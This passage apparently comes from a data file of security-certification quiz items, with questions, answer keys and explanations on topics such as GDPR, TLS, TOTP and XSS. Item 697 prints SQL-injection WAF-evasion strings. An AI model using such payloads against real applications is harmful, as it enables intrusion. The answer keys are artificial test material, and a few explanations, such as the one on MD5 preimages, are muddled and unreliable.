groups.","Roaming profile compromise is a specific persistence technique; the question contrasts threat hunting — internal proactive investigation for attacker presence — with threat intelligence, which provides external context about attacker TTPs and campaigns."]},
  {id:683,domain:A,question:"What is a security configuration baseline's relationship to CIS Benchmarks?",options:["CIS Benchmarks consistently enforce stricter security hardening levels than typical organizational baselines require, making Level 2 profiles unsuitable for most commercial environments outside regulated industries","CIS Benchmarks provide community-developed, vendor-specific security configuration recommendations that organizations can adopt as their security baselines — providing a starting point rather than building from scratch","Organizational security baselines and CIS Benchmarks always contain identical configuration settings because all organizational baselines are directly copied from published CIS Benchmark documents without modification","CIS Benchmarks are proprietary resources available only to paying Center for Internet Security member organizations, requiring annual licensing fees for organizations wishing to implement them commercially"],answer:1,explanation:"CIS Benchmark for Windows Server 2022 provides 900+ specific hardening settings — organizations use these as their baseline, potentially adjusting for business requirements.",optionExplanations:["CIS Benchmark Level 1 profiles aim for reasonable operational security without significant impact; they are not inherently stricter than all custom baselines — organizations may adopt, customize, or exceed CIS recommendations.","CIS Benchmarks are freely available, consensus-developed configuration guidance for specific technologies — organizations implement them as their security baselines rather than defining all settings from scratch.","Organizations customizing CIS Benchmarks for their environment create baselines that differ from the original benchmarks; baselines based on CIS recommendations are informed by them but adapted to specific operational and technical requirements.","CIS Benchmarks are freely downloadable at no cost from the CIS website; while CIS offers paid membership with additional resources, the benchmark documents themselves are publicly available without cost or licensing restrictions."]},
  {id:684,domain:P,question:"What is a data subject's right to object under GDPR?",options:["A broad GDPR right enabling individuals to preemptively block all future personal data collection by any organization, irrespective of the legal basis being used to justify the proposed processing","An individual's right to object to processing of their personal data based on legitimate interests, direct marketing, or scientific/statistical research — requiring cessation unless compelling grounds override it","A specific GDPR data subject right allowing individuals to contest decisions made entirely through automated processing without any meaningful human review, oversight, or intervention in the outcome","A procedural right enabling data subjects to file formal written complaints with national data protection supervisory authorities when they believe an organization has violated their privacy rights under GDPR"],answer:1,explanation:"Direct marketing objections must always be honored; legitimate interest objections require a balancing — compelling legitimate grounds can override the objection but must be demonstrated.",optionExplanations:["The right to object has specific conditions and applies to specific legal bases; it is not an absolute right to block all collection — organizations can override objections with compelling legitimate grounds for processing.","GDPR Article 21 allows individuals to object to processing based on legitimate interests — organizations must stop processing unless they can demonstrate compelling legitimate grounds overriding the individual's interests.","Article 22 provides rights regarding solely automated decision-making; Article 21's right to object applies to processing based on legitimate interests, direct marketing, and research — broader than just automated decision-making.","The right to lodge complaints with supervisory authorities is a separate GDPR right under Article 77; the right to object under Article 21 is a direct right exercised against the data controller to cease processing personal data."]},
  {id:685,domain:G,question:"What is a Schnorr signature scheme?",options:["A high-throughput digital signature algorithm optimized for embedded systems and performance-critical applications, producing larger signatures than ECDSA with higher computational efficiency in resource-constrained environments","An efficient digital signature scheme based on discrete logarithms, providing the same security as DSA with smaller signatures and enabling signature aggregation","A symmetric-key based message authentication code algorithm developed by security researcher and prolific author Bruce Schneier as part of his applied cryptography research contributions","A lattice-based post-quantum digital signature algorithm specifically designed to resist attacks from large-scale fault-tolerant quantum computers running Shor's algorithm against discrete logarithm assumptions"],answer:1,explanation:"Schnorr signatures enable MuSig (multi-signature aggregation) in Bitcoin Taproot — multiple signers produce a single compact signature indistinguishable from a single-signer signature.",optionExplanations:["Schnorr signatures actually produce smaller signatures than DSA/ECDSA; they were developed by Claus-Peter Schnorr, not for throughput optimization — they are valued for mathematical elegance, smaller output size, and signature aggregation.","Schnorr signatures have elegant mathematical properties — they're simpler to implement, smaller than DSA signatures, provably secure under standard assumptions, and support signature aggregation.","Bruce Schneier is a separate security professional known for Blowfish and Twofish ciphers; Schnorr signatures were developed by mathematician Claus-Peter Schnorr based on discrete logarithm problems in prime-order groups.","Lattice-based signatures like Dilithium are post-quantum designs; Schnorr signatures use elliptic curve or finite field discrete logarithms and are vulnerable to quantum attacks — they are valued for efficiency and aggregation in classical computing."]},
  {id:686,domain:T,question:"What is a time-based one-time password (TOTP)?",options:["A password security mechanism that marks stored passwords as expired after a configurable time period, forcing users to create a new password before they can authenticate to systems requiring periodic rotation","A temporary authentication code generated from a shared secret and the current time, valid for a short window (typically 30 seconds) — used as a second factor in MFA","A one-time authentication code delivered via SMS text message to a registered mobile phone number, valid for a short period after transmission, used to verify user identity during login","An enterprise authentication policy requiring users to change their primary login credentials according to a fixed recurring schedule defined by the organization's security policy and applicable compliance requirements"],answer:1,explanation:"TOTP (RFC 6238) — used in Google Authenticator, Authy, Microsoft Authenticator — generates codes by combining the shared secret with Unix timestamp divided into 30-second windows.",optionExplanations:["Password expiration policies govern credential rotation schedules; TOTP generates time-synchronized one-time authentication codes derived from a shared secret and the current Unix timestamp, used as a second factor in MFA workflows.","TOTP generates a 6-8 digit code from HMAC-SHA1(shared_secret, floor(unix_time/30)) — both the authenticator app and authentication server compute the same value independently.","SMS-delivered OTPs use out-of-band delivery; TOTP specifically generates codes through local computation using a shared secret and current time — no transmission occurs, and both the authenticator app and server compute the same value independently.","Mandatory password rotation schedules are password management policies; TOTP is a second-factor authentication mechanism that generates short-lived codes from time and a shared secret — unrelated to password rotation policies."]},
  {id:687,domain:A,question:"What is a security token service (STS)?",options:["A hardware provisioning service that manufactures, programs, and ships physical RSA SecurID tokens, FIDO2 security keys, or smart cards to enterprise users enrolled in multi-factor authentication programs","A service that issues, validates, and renews security tokens (SAML assertions, OAuth tokens, JWT) for authentication and authorization across applications and services","An automated kiosk installed at facility entrances that dispenses pre-programmed RFID proximity cards to authorized visitors after verifying their identity against a pre-loaded approved visitor database","A vendor-hosted provisioning service that generates, programs, and delivers physical one-time password hardware tokens and FIDO2 security keys to enterprise employees enrolled in authentication programs"],answer:1,explanation:"AWS STS, Azure Active Directory, and corporate SSO providers act as STS — issuing short-lived tokens that applications accept without each application managing credentials independently.",optionExplanations:["Physical token manufacturing and distribution is a hardware vendor function; a Security Token Service is a software service that issues, validates, and renews digital authentication tokens like SAML assertions, OAuth tokens, and JWTs.","An STS is the trust broker in modern authentication — it authenticates users/services and issues time-limited tokens that other services accept, enabling single sign-on and federated identity.","Physical visitor management kiosks are facility access control systems; an STS is a software service that authenticates users and issues cryptographically signed digital tokens for application and API access authorization.","Physical token provisioning services distribute hardware authentication devices; an STS issues software-based digital authentication tokens — SAML assertions, OAuth access tokens, and JWTs — for application authentication and authorization."]},
  {id:688,domain:O,question:"What is a security playbook?",options:["A high-level strategic planning document outlining an organization's long-term cybersecurity vision, budget priorities, and goals without prescribing specific operational procedures for incident types","Documented, step-by-step procedures for responding to specific security incident types, ensuring consistent and effective response regardless of which analyst handles the incident","A laminated quick-reference card posted at security checkpoints listing approved identification documents, visitor registration requirements, and emergency contact numbers for physical security personnel","A narrative strategy document describing an organization's overall security philosophy, risk tolerance framework, and general security program objectives without providing actionable response procedures"],answer:1,explanation:"Playbooks for ransomware, phishing, data breach, and insider threat ensure every analyst follows the same effective procedure — critical for consistency when handling incidents under pressure.",optionExplanations:["Strategic planning documents describe organizational direction; security playbooks are operational artifacts containing specific step-by-step procedures for responding to particular incident types to ensure consistent analyst response.","Security playbooks provide structured, decision-tree style procedures for specific incident types — containing containment steps, investigation commands, escalation criteria, and documentation requirements.","Physical security checkpoint reference materials support guards; cybersecurity playbooks are operational response guides containing step-by-step technical procedures for digital security incidents, ensuring consistent analyst response.","Security strategy documents describe direction and principles; playbooks provide specific tactical procedures for individual incident types — containing exact steps, commands, escalation paths, and documentation requirements for effective response."]},
  {id:689,domain:T,question:"What is a dumpster diving attack?",options:["Exploiting vulnerabilities in municipal waste management SCADA systems or environmental compliance monitoring infrastructure to compromise the industrial control networks managing sanitation operations","Searching through physical waste (trash bins, recycling) to find discarded documents, storage media, or equipment containing sensitive information","Exploiting the heat exhaust vented from server room cooling systems to create electromagnetic interference that disrupts nearby wireless network communications and degrades wireless access point performance","A misdirection attack that lures victims to websites containing low-quality or irrelevant content, wasting their attention and distracting them from productive work or vigilance against real threats"],answer:1,explanation:"Organizations discard sensitive documents (shredder bypass), USB drives, hard drives, and old servers in trash — attackers recover account numbers, passwords written on sticky notes, and confidential memos.",optionExplanations:["ICS attacks on waste management infrastructure are OT security incidents; dumpster diving is a simple physical technique requiring no technical exploitation — searching through physical trash and recycling receptacles for discarded sensitive materials.","Dumpster diving recovers sensitive information from physical waste — discarded unshredded documents, hard drives not wiped, and decommissioned equipment can contain valuable intelligence.","HVAC heat exhaust interference with wireless signals is a physical environment concern; dumpster diving specifically involves physically searching through discarded waste receptacles for documents, storage media, or equipment containing sensitive information.","Content misdirection attacks exploit attention and trust; dumpster diving is a straightforward physical reconnaissance technique — manually searching through physical trash containers for sensitive discarded materials like unshredded documents or old hard drives."]},
  {id:690,domain:G,question:"What is the difference between asymmetric encryption's public and private keys?",options:["Public keys are invariably longer in bit length than their paired private keys because asymmetric key generation algorithms always produce larger public key output containing additional mathematical parameters absent from private key representations","The public key can be freely shared and is used to encrypt data or verify signatures; the private key is secret and is used to decrypt data or create signatures — mathematically linked but computationally infeasible to derive one from the other","Public and private keys in asymmetric cryptography are mathematically interchangeable — either key can be used to encrypt or decrypt data depending on the application, making the designation of which is public arbitrary","Asymmetric encryption public keys perform cryptographic operations more rapidly than private keys because the public exponent is typically a small value while private key decryption requires computationally expensive operations with large factors"],answer:1,explanation:"The mathematical relationship between RSA keys (based on prime factorization difficulty) means you can freely distribute the public key without compromising the private key's security.",optionExplanations:["In RSA, both keys are the same modulus length; in ECC, keys are small but the public key includes both X and Y coordinates. The real distinction is not length but role — public keys encrypt/verify, private keys decrypt/sign.","Public key infrastructure works because: anyone can encrypt with your public key, but only you can decrypt with your private key; you sign with your private key, anyone verifies with your public key.","Standard asymmetric operations are not interchangeable by design: the public key is used for encryption and signature verification; the private key for decryption and signing — these roles are determined by the cryptographic protocol, not arbitrarily assigned.","While public key operations can be faster due to small exponents, the key distinction is functional roles — not speed; public keys encrypt/verify and are freely shared, while private keys decrypt/sign and must remain secret."]},
  {id:691,domain:T,question:"What is a watering hole attack's defense strategy?",options:["Deploying honeypot websites that simulate commonly visited industry portals to detect and lure watering hole attackers before they compromise the legitimate sites that target employees actually visit","Browser security (hardening, patching), web filtering, network monitoring for unusual outbound connections, and endpoint protection to catch drive-by downloads before execution","Completely blocking all employee internet access to any websites not explicitly pre-approved and placed on a maintained allowlist by IT security, enforced at the perimeter firewall for all traffic","Training employees to access only websites belonging to an organization-approved vendor list, with mandatory IT security team approval required before visiting any external industry research or reference website"],answer:1,explanation:"Defense: patch browsers and plugins immediately, use browser sandboxing (Chrome, Edge), deploy network proxies with SSL inspection, and monitor endpoint behavior for post-exploit activities.",optionExplanations:["Honeypot sites can serve as deception defense, but they don't protect employees from already-compromised legitimate sites; browser hardening, web filtering, network monitoring, and endpoint protection form the practical layered defense.","Layered defenses address watering holes: browser hardening reduces exploit surface, web filtering blocks known malicious sites, endpoint protection catches payload execution, network monitoring detects C2 communications.","Blanket internet blocking is operationally impractical and prevents legitimate work; risk-based layered controls — browser hardening, web filtering for known-malicious sites, and endpoint protection — provide effective defense while preserving productivity.","Restrictive approved-site list policies are impractical for business operations; effective watering hole defense uses browser hardening, web content filtering, network traffic monitoring, and endpoint protection to catch compromised sites and malware execution."]},
  {id:692,domain:A,question:"What is a security architecture review?",options:["A physical security assessment evaluating a building's structural integrity, entry point hardening, wall construction, window resistance, and overall physical layout for security against forced entry","A structured evaluation of a system or solution design from a security perspective, identifying design flaws, control gaps, and threat vectors before implementation","A procurement evaluation assessing the technical architecture, integration capabilities, and scalability of competing security product platforms before making purchasing and deployment decisions","A data center floor plan evaluation to verify that server rack placement, network equipment positioning, cable management, and physical security controls are optimally configured for operational efficiency"],answer:1,explanation:"Architecture reviews catch flaws early — identifying that a proposed API design lacks rate limiting or that a data flow routes customer PII through unsecured third-party systems.",optionExplanations:["Physical facility security assessments evaluate building hardening; security architecture reviews evaluate technical system and solution designs — identifying design flaws, missing controls, improper trust boundaries, and threat vectors before implementation.","Architecture reviews analyze proposed designs against security principles — identifying missing encryption, improper trust boundaries, inadequate segmentation, and control gaps before code is written.","Vendor security product evaluations support procurement; security architecture reviews assess proposed system or solution designs against security principles — identifying vulnerabilities in designs before development begins.","Data center layout optimization addresses operational efficiency; security architecture reviews evaluate logical system and solution designs from a security perspective — identifying design flaws and control gaps before technical implementation."]},
  {id:693,domain:O,question:"What is a purple team's output compared to a red team engagement?",options:["Purple team exercises produce comprehensive reports using red-and-blue combined color coding in visual dashboards, displaying attack path heat maps and defense coverage matrices to summarize security posture","Purple team outputs focus on detection improvement and control enhancement, providing both attacker techniques used and the defensive detections and responses that were triggered or were missing","Purple team engagements produce reports substantively identical to standard red team assessments, documenting only discovered vulnerabilities and successful exploits without incorporating defensive team detection insights","Purple team exercises exclusively produce attacker-perspective vulnerability reports listing discovered weaknesses and exploitation paths, without documenting defensive detection capabilities or control improvement recommendations"],answer:1,explanation:"Purple team reports map TTPs to ATT&CK, show what was detected vs. missed, and provide specific SIEM rule recommendations — enabling measurable defensive improvement.",optionExplanations:["The 'purple' designation reflects the combined red team offensive and blue team defensive perspectives; purple team output focuses on detection gaps and control improvements — not color-coded visual branding.","Purple team reports document attack TTPs, detection coverage (what was detected vs. missed), SIEM rule gaps, response time measurements, and specific improvements to detection and response capabilities.","Red team reports focus on offensive findings; purple team outputs explicitly include defensive coverage analysis — what was detected versus missed, SIEM rule gaps, response time measurements, and specific control enhancement recommendations.","Attacker-only reports are red team deliverables; purple team reports equally emphasize defensive lessons — which TTPs were detected, which bypassed detection, what rule improvements are needed, and how response procedures should be enhanced."]},
  {id:694,domain:P,question:"What is a data minimization impact on cybersecurity risk?",options:["Collecting more comprehensive personal data improves security monitoring accuracy by providing richer behavioral analytics, anomaly detection models, and threat intelligence correlation for insider threat programs","Collecting less personal data reduces the value and impact of data breaches, lowering both the breach's harm to individuals and the organization's regulatory and reputational exposure","Data minimization practices have no measurable effect on organizational security risk because attackers select targets based on strategic value and reputation, not the volume of personal data stored","Data minimization reduces storage infrastructure costs and simplifies governance processes, but the harm caused to individuals by data breaches remains constant regardless of how much personal data was actually exposed"],answer:1,explanation:"You can't breach data you don't collect — an organization that collects only email and purchase history exposes far less in a breach than one that also collects SSNs, birthdates, and medical history.",optionExplanations:["Security monitoring benefits from telemetry data, not personal data; data minimization reduces breach impact — personal data minimization and security monitoring data are separate concerns that don't trade off against each other.","Data minimization directly reduces breach impact — a breach of non-sensitive operational data is dramatically less harmful than a breach of full identity records with sensitive personal information.","Data minimization directly reduces breach impact — less data exposed means less harm to individuals and lower regulatory fines; attackers may value organizations for strategic reasons but the severity of breach consequences scales with data exposure.","Both benefits apply simultaneously — minimizing data reduces storage costs AND reduces breach harm; a breach exposing minimal non-sensitive data causes far less individual harm and regulatory exposure than a breach of comprehensive identity records."]},
  {id:695,domain:G,question:"What is a cipher suite in TLS?",options:["A dedicated secured office environment within a facility where cryptographers and key management personnel perform sensitive cryptographic operations, handle key material, and configure hardware security modules","A named combination of cryptographic algorithms used in a TLS connection — specifying the key exchange algorithm, authentication algorithm, bulk encryption cipher, and MAC algorithm","A commercial software bundle containing multiple desktop cryptographic utility programs for file encryption, asymmetric key generation, hash computation, and digital certificate management","A packaged collection of X.509 certificates from a single certificate authority, distributed as a trust store bundle to configure TLS client validation settings in browsers and operating systems"],answer:1,explanation:"TLS_AES_256_GCM_SHA384 specifies: TLS protocol, AES-256-GCM for authenticated encryption, SHA-384 for PRF — TLS 1.3 simplified to only 5 cipher suites, all providing perfect forward secrecy.",optionExplanations:["Secure facilities for cryptographic personnel are physical security controls; cipher suites are cryptographic configuration parameters specifying the named combination of key exchange, authentication, encryption, and MAC algorithms for TLS connections.","A cipher suite like TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 specifies: ECDHE (key exchange with PFS), RSA (certificate authentication), AES-256-GCM (encryption + integrity), SHA-384 (PRF).","Cryptographic software suites are collections of tools; a cipher suite is a specific TLS protocol parameter — a named combination of algorithms specifying how key exchange, authentication, bulk encryption, and integrity verification are performed.","CA certificate bundles are PKI trust anchors; cipher suites are TLS negotiation parameters specifying the cryptographic algorithm combination — key exchange method, authentication algorithm, bulk cipher, and hash function — used in a TLS session."]},
  {id:696,domain:T,question:"What is an insider threat detection indicator?",options:["An employee reporting suspicious activity","Behavioral indicators suggesting an employee may be exfiltrating data or preparing to cause harm — such as unusual data access patterns, downloading large volumes, accessing systems outside job role, or expressing grievances","A physical indicator of insider presence","An external attack attributed to an insider source"],answer:1,explanation:"UEBA (User and Entity Behavior Analytics) tools detect anomalies: an accountant accessing R&D files at 2am, mass email of company files to personal account, or printing thousands of pages before resignation.",optionExplanations:["Employees reporting suspicions are witnesses; indicators are observable behaviors suggesting insider threat activity.","Insider threat indicators include: accessing unusual systems, bulk data downloads, after-hours access, using personal email/USB, printing sensitive files, accessing terminated accounts, or expressing disgruntlement about organizational decisions.","Physical indicators are physical security concerns; behavioral indicators are digital activity patterns analyzed in security monitoring.","External attack attribution is threat intelligence; insider threat indicators are internal behavioral signals from within the organization."]},
  {id:697,domain:A,question:"What is a WAF bypass technique?",options:["Physically bypassing a Web Application Firewall","Methods attackers use to evade WAF detection — encoding payloads, obfuscating attack strings, using alternative syntax, or exploiting WAF rule gaps to deliver payloads that the WAF doesn't recognize","A technique for tuning WAF rules","Bypassing WAF for authorized penetration testing"],answer:1,explanation:"SQL injection bypasses: '/*!50000UNION*/SELECT' (MySQL comments), URL double encoding '%2527', or using equivalent syntax ('1' AND '1'='1' vs '1' OR '1'='1') that achieves the same injection.",optionExplanations:["Physical bypassing is not applicable; WAF bypass is about evading application-layer detection rules.","WAF bypasses exploit the gap between WAF pattern matching and database/interpreter behavior — using obfuscation, encoding, or alternative syntax that passes WAF rules but executes as the intended attack.","Rule tuning reduces bypasses; bypass techniques are offensive methods to defeat WAF rules.","Authorized testing may identify bypasses; the techniques themselves are the evasion methods."]},
  {id:698,domain:O,question:"What is a security gap in the MITRE ATT&CK framework context?",options:["A physical security gap in building defenses","ATT&CK techniques for which an organization has no detection capability — identified through mapping existing detections to ATT&CK and finding uncovered techniques","A gap in MITRE ATT&CK documentation","Missing techniques in the ATT&CK matrix"],answer:1,explanation:"ATT&CK coverage analysis reveals: 'We have 60% coverage of Execution techniques but only 20% of Defense Evasion — attackers can bypass defenses without any detection.'",optionExplanations:["Building physical gaps are physical security issues; ATT&CK gaps are detection coverage gaps in cybersecurity.","Mapping security tools' detections to ATT&CK techniques reveals blind spots — techniques where attackers can operate undetected because no security control monitors for them.","ATT&CK documentation gaps would be a MITRE research gap; security gaps are the organizational detection gaps.","Missing ATT&CK techniques would be MITRE's issue; security gaps are about which techniques organizations can't detect."]},
  {id:699,domain:T,question:"What is a social engineering toolkit (SET)?",options:["A toolkit for developing social skills","An open-source penetration testing framework specifically designed for social engineering attacks — enabling phishing campaigns, credential harvesting, and payload delivery for authorized security testing","A set of tools for social media security","A toolkit for teaching social engineering awareness"],answer:1,explanation:"SET (Social Engineering Toolkit by TrustedSec) is used in authorized red team engagements to test human security controls — spear phishing campaigns, website cloning, and SMS attacks.",optionExplanations:["Personal development tools are different; SET is a cybersecurity testing tool.","SET automates social engineering attacks for authorized testing — creating convincing phishing emails, cloning legitimate websites to capture credentials, and testing whether employees follow security policies.","Social media security tools focus on account protection; SET is a penetration testing toolkit for authorized security assessments.","Awareness training uses simulated attacks but different tools; SET is specifically a penetration testing framework for authorized professional use."]},
  {id:700,domain:G,question:"What is a preimage resistance property of hash functions?",options:["Resistance to creating preview images","The cryptographic property that it should be computationally infeasible to find any input m such that hash(m) equals a given hash value H — making reversal of the hash function practically impossible","Resistance to attacks before images are processed","The inability to predict hash function outputs"],answer:1,explanation:"MD5 lacks preimage resistance for short inputs — given MD5('password')='5f4dcc3b5aa765d61d8327deb882cf99', finding 'password' from the hash must be computationally infeasible.",optionExplanations:["Preview images are UI elements; preimage resistance is a cryptographic security property of hash functions.","Preimage resistance means hash functions are one-way — given H, finding any m where H(m)=H is computationally infeasible, preventing reversal of stored password hashes.","Image processing is a different context; preimage resistance is about mathematical reversal of hash functions.","Output unpredictability is pseudorandomness; preimage resistance specifically addresses the impossibility of reversing a hash to find an input."]},
  {id:701,domain:O,question:"What is the purpose of a cyber range?",options:["A physical firing range for cybersecurity training","A virtual environment that replicates network infrastructure for hands-on security training, red/blue team exercises, and testing defensive tools without risking production systems","A range of cyber security tools available","A geographic range of cybersecurity operations"],answer:1,explanation:"Cyber ranges (SANS NetWars, National Cyber Range) enable realistic attack-and-defend exercises — participants practice incident response against real attack tools in isolated, consequence-free environments.",optionExplanations:["Physical firing ranges are completely different; cyber ranges are virtual training environments.","Cyber ranges provide realistic simulated environments where security professionals can practice offensive and defensive techniques, test new tools, and run exercises without any risk to real infrastructure.","Tool inventories are different from training environments; ranges emphasize hands-on practice.","Geographic ranges are physical concepts; cyber ranges are virtual technical training environments."]},
  {id:702,domain:T,question:"What is a FIDO2 (WebAuthn) authentication method?",options:["A 2G cellular authentication method","A passwordless authentication standard using hardware security keys or platform authenticators (biometrics) that provide phishing-resistant authentication via cryptographic challenge-response","A two-factor authentication standard using SMS","A federal digital identity standard"],answer:1,explanation:"FIDO2 eliminates phishing — credentials are domain-bound and never leave the device. Even if tricked onto a phishing site, the key won't authenticate because the domain doesn't match.",optionExplanations:["2G is cellular technology; FIDO2 is an authentication standard that works over any network.","FIDO2 uses public key cryptography bound to specific domains — the authenticator (YubiKey, Touch ID) proves possession without transmitting credentials, making phishing and credential theft impossible.","SMS 2FA is one-time-code based; FIDO2 is phishing-resistant because credentials are cryptographically tied to specific websites.","FIDO2 is developed by the FIDO Alliance with W3C; it's an industry standard, not exclusively federal."]},
  {id:703,domain:A,question:"What is a network tap vs. a network span (mirror) port?",options:["A tap is hardware; a span port is software","A network tap is a physical device inserted inline that passively copies all traffic to a monitoring port; a span port mirrors traffic in software on a switch — taps are more reliable and don't miss packets under load","Taps monitor wireless; span ports monitor wired","Span ports are more accurate than taps"],answer:1,explanation:"Taps guarantee full-duplex packet capture at any traffic level; span ports can drop packets when switch processors are busy — critical for forensics and intrusion detection requiring complete traffic visibility.",optionExplanations:["Both taps (hardware) and span ports (software/ASIC) can be deployed; the key distinction is reliability and completeness.","Hardware taps split the optical or electrical signal, providing a complete passive copy to monitoring tools; span ports use switch software/ASIC to copy traffic but may drop packets under high load.","Both monitor wired traffic types; neither is exclusively for wireless monitoring.","Taps are generally more accurate for complete capture; span ports are more convenient but may miss packets under high load conditions."]},
  {id:704,domain:P,question:"What is third-party risk management in privacy?",options:["Managing risks from third-party applications","Evaluating and managing privacy risks arising from sharing personal data with vendors, partners, and service providers who may not have equivalent data protection standards","Third-party assessment of an organization's privacy","Risk management conducted by third parties"],answer:1,explanation:"GDPR Article 28 requires data processing agreements with processors; third-party risk programs audit vendor security, review DPAs, and assess whether vendors' privacy practices meet organizational and regulatory standards.",optionExplanations:["Third-party applications are IT risk; third-party privacy risk focuses on personal data handling by vendors.","Third-party risk management assesses vendors before sharing personal data with them — security questionnaires, DPA reviews, on-site audits — and monitors ongoing compliance with data protection obligations.","Third-party privacy assessment is one tool; third-party risk management is the complete program.","Using third parties for risk management is an outsourcing decision; third-party privacy risk management assesses risks from using third parties."]},
  {id:705,domain:G,question:"What is RSA encryption and its key size requirements?",options:["A Royal Security Algorithm requiring 256-bit keys","An asymmetric cryptographic algorithm based on the difficulty of factoring large prime number products — requiring key sizes of 2048+ bits for security equivalent to 128-bit symmetric keys","An encryption algorithm using only 512-bit keys","A symmetric encryption algorithm developed by RSA Security"],answer:1,explanation:"RSA-1024 is considered broken; RSA-2048 is current minimum; RSA-4096 is preferred for sensitive/long-lived keys — keys must be much larger than symmetric because the mathematical problem is harder to scale.",optionExplanations:["RSA was developed by Rivest, Shamir, and Adleman; it's not a Royal Security Algorithm.","RSA derives security from integer factorization difficulty — factoring a product of two large primes. Key sizes must be much larger than symmetric keys because the problems have different hardness properties.","RSA-512 was broken in 1999; modern RSA requires minimum 2048-bit keys for security.","RSA is asymmetric, not symmetric; it uses different key sizes than symmetric algorithms like AES."]},
  {id:706,domain:T,question:"What is a network packet injection attack?",options:["Injecting physical packets into a network","Inserting forged packets into a network stream to modify communications, inject commands into existing sessions, or disrupt established connections","Injecting packets for network performance testing","A technique for accelerating packet delivery"],answer:1,explanation:"TCP injection can hijack sessions (inject commands into an SSH session), dereference ARP tables, or disrupt connections — requires on-path position or network-level access.",optionExplanations:["Physical packet injection doesn't apply; this is a network communication attack.","Packet injection attacks insert packets with spoofed source addresses into network streams — requiring knowledge of sequence numbers and on-path position or network access to inject into sessions.","Performance testing injections use legitimate tools; attack injection inserts unauthorized forged packets.","Packet injection does the opposite of acceleration — it disrupts or manipulates communications."]},
  {id:707,domain:A,question:"What is a privileged identity management (PIM) solution?",options:["Managing privileged employees' identities","A security solution that manages and controls privileged access, providing just-in-time elevation, session recording, credential vaulting, and privileged account lifecycle management","A system for managing administrator passwords","A tool for monitoring privileged user activities"],answer:1,explanation:"CyberArk, BeyondTrust, and Azure PIM vault privileged credentials, require approval for access, record sessions, and auto-rotate passwords — dramatically reducing privileged account compromise risk.",optionExplanations:["Privileged employee management is HR; PIM manages technical access credentials for privileged systems.","PIM solutions store privileged credentials in encrypted vaults, require just-in-time access approval, record all privileged sessions for audit, and rotate passwords automatically after use.","Password management tools store credentials; PIM provides the full lifecycle of privileged access control.","Activity monitoring is one PIM function; PIM provides the complete privileged access management lifecycle."]},
  {id:708,domain:O,question:"What is cyber deception technology's key operational benefit?",options:["Making attackers feel deceived emotionally","Generating high-confidence, low-noise alerts — any interaction with deception assets is definitely malicious, providing early warning and intelligence without the false positive burden of signature-based tools","Deceiving executive leadership about security posture","Providing realistic training scenarios for security teams"],answer:1,explanation:"A honeypot alert has near-zero false positives — no legitimate user has any reason to access it. Compare to SIEM alerts with 95%+ false positive rates — deception alerts require immediate attention.",optionExplanations:["Emotional deception is not the goal; operational security benefits drive deception technology adoption.","Deception technology creates pristine detection — only attackers interact with honeypots, fake credentials, and decoy files, providing high-fidelity alerts without the alert fatigue of traditional signature-based detection.","Deception technology provides accurate security intelligence to leadership; it doesn't mislead.","Training environments use different technologies; deception technology is deployed in production environments to detect real attackers."]},
  {id:709,domain:T,question:"What is a watering hole attack's attribution challenge?",options:["Water cannot be traced to a source","Attackers leave minimal forensic evidence — they compromise intermediate websites rather than attacking targets directly, creating distance between the attacker and the ultimate victim","Attribution is easy since the attack website is identified","Watering hole attacks always leave distinctive signatures"],answer:1,explanation:"Attribution requires: compromise the intermediary website, find the injected code, reverse engineer it, trace infrastructure — multiple hops create distance that makes attacker attribution difficult and time-consuming.",optionExplanations:["Physical water tracing is a different metaphor; attribution difficulty is about forensic investigation complexity.","Watering hole attacks use compromised legitimate sites as launchers — forensic investigation must trace: attack payload → compromised website → attacker infrastructure → attacker identity, with each step potentially using additional intermediaries.","The intermediary website being identified is just the beginning; tracing from there to the actual attacker requires significant investigative effort.","Sophisticated attackers deliberately avoid distinctive signatures; they use common malware families, shared infrastructure, and obfuscation to complicate attribution."]},
  {id:710,domain:G,question:"What is an S/MIME email security standard?",options:["Simple/Multipurpose Internet Mail Extensions","Secure/Multipurpose Internet Mail Extensions — a standard for public key encryption and digital signing of email messages, providing confidentiality (encryption) and authenticity (digital signatures)","A secure email server configuration standard","A standard for email attachment security scanning"],answer:1,explanation:"S/MIME encrypts email content end-to-end using recipient's public key (only recipient can decrypt) and signs messages with sender's private key (recipient verifies sender authenticity).",optionExplanations:["S/MIME stands for Secure/Multipurpose Internet Mail Extensions; it's not 'Simple'.","S/MIME uses X.509 certificates to sign emails (proving sender identity and message integrity) and encrypt content (ensuring only the intended recipient can read the message).","Server configuration standards are separate; S/MIME is an end-to-end cryptographic email security protocol.","Attachment scanning is email gateway security; S/MIME provides cryptographic email authentication and encryption."]},
  {id:711,domain:T,question:"What is a cross-site scripting (XSS) stored vs. reflected attack?",options:["Stored attacks persist in memory; reflected attacks don't","Stored XSS (persistent) saves malicious script in the database, executing for every visitor who loads the affected page; reflected XSS executes immediately from a malicious link without being stored","Reflected XSS is more dangerous than stored XSS","They are the same attack with different names"],answer:1,explanation:"Stored XSS in a forum post infects every visitor; reflected XSS requires the victim to click a crafted link containing the script in the URL parameter — stored XSS has much larger impact.",optionExplanations:["Memory persistence is different; stored vs. reflected describes where the malicious script resides.","Stored XSS persists in the application database, affecting all users who view the page containing it; reflected XSS is in the URL/request and requires the victim to submit a crafted request.","Stored XSS is generally more impactful because it affects all visitors without requiring individual targeting; reflected XSS requires each victim to click a malicious link.","Stored and reflected are distinct XSS attack types with different impact profiles and delivery mechanisms."]},
  {id:712,domain:A,question:"What is a data loss prevention (DLP) system?",options:["A system for preventing loss of security staff","Technology that monitors, detects, and prevents unauthorized transmission of sensitive data, enforcing data classification and handling policies across endpoints, networks, and cloud services","A backup system preventing data loss","A system preventing employees from losing company devices"],answer:1,explanation:"DLP (Symantec, Forcepoint, Microsoft Purview) detects when someone emails a file with 16-digit credit card numbers, blocks it, and alerts the security team — enforcing data handling policies automatically.",optionExplanations:["Personnel management is HR; DLP focuses on data security.","DLP inspects data flows — email attachments, USB transfers, cloud uploads, web traffic — and applies policies based on data classification to prevent sensitive data from leaving the organization unauthorized.","Backup systems prevent data loss from failure; DLP prevents unauthorized exfiltration of sensitive data.","Device management is MDM; DLP specifically monitors and controls data movement based on content classification."]},
